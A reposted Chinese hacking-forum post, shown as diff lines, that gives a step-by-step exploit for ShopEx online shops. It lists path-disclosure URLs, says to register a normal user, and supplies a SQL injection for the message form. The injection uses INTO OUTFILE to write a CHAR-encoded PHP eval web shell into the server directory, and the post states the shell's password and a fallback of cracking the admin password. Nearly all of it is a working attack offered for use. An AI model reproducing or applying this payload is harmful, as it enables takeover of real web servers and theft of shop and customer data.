@@ -1,0 +1,53 @@
+
+[【转载】] shopex前台普通用户getshell最新漏洞
+ 
+
+
+
+本帖最后由 query1688 于 2012-10-12 01:38 编辑 
+
+在wooyun上看到的，感觉不错，就转了~
+ wooyun,2012年9月27日
+ 
+利用方法：
+ 
+第一个：想办法找到目标网站的绝对路径
+ 
+
+
+http://www.wooyun.in/install/svinfo.php?phpinfo=true
+ 
+http://www.wooyun.in/core/api/shop_api.php
+ http://www.wooyun.in/core/api/site/2.0/api_b2b_2_0_cat.php
+ http://www.wooyun.in/core/api/site/2.0/api_b2b_2_0_goodstype.php
+ http://www.wooyun.in/core/api/site/2.0/api_b2b_2_0_brand.php
+ 
+shopex存在很多爆路径的漏洞，请自行研究。
+ 
+第二个：注册一个普通用户
+ 
+http://www.wooyun.in/?passport-signup.html
+ 
+第三个：
+ 
+发送消息
+ 
+http://www.wooyun.in/?member-send.html
+ 
+
+
+
+
+
+
+代码
+ 
+    wooyun.in' union select  CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 39, 35, 39, 93, 41, 59, 63, 62) into outfile 'E:/zkeysoft/www/x.php'  #
+ 
+     
+ 
+    一句话的密码是#
+ 
+    这个漏洞，对于mysql用户权限有要求的，对于导出的目录也得有可写的要求，服务器环境也有要求。
+ 
+    如果无法getshell的话，也可以尝试注入，破密码进后台也一样 
